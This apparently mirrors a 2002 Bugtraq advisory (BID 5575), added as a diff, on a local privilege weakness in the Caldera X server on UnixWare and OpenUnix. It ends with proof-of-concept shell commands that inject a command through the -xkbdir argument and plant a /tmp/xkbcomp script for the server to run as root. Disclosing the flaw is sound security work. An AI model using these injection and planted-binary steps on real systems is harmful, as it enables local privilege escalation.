@@ -1,0 +1,98 @@
+#SpeeDr00t@Black Falcon<br>#bid5575<p><b><span style="font-size: 18pt;">Caldera X Server External Program Privileged Invocation Weakness</span></b></p><br><br><a href="http://www.securityfocus.com/bid/5575/info">info</a><br><a href="http://www.securityfocus.com/bid/5575/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/5575/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/5575/solution">solution</a><br><a href="http://www.securityfocus.com/bid/5575/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				5575
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 27 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Aug 27 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability is credited to Olaf Kirch (okir@suse.de).
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Caldera UnixWare 7.1.1 <br/>
+					
+				
+					Caldera OpenUnix 8.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concepts were provided by Pavel Kankovsky:<br/>$ Xserver -xkbdir 'id &gt; /tmp/I_WAS_HERE;'<br/>exit X server<br/>$ grep root /tmp/I_WAS_HERE &amp;&amp; echo 'Gotcha!'<br/><br/>$ cat &gt; /tmp/xkbcomp<br/>#!/bin/sh<br/>id &gt; /tmp/I_WAS_HERE<br/>ctrl+d<br/>$ chmod a+x /tmp/xkbcomp<br/>$ Xserver -xkbdir /tmp<br/>X server executes /tmp/xkbcomp
+	
+		<ul>
+</ul>
+</div>
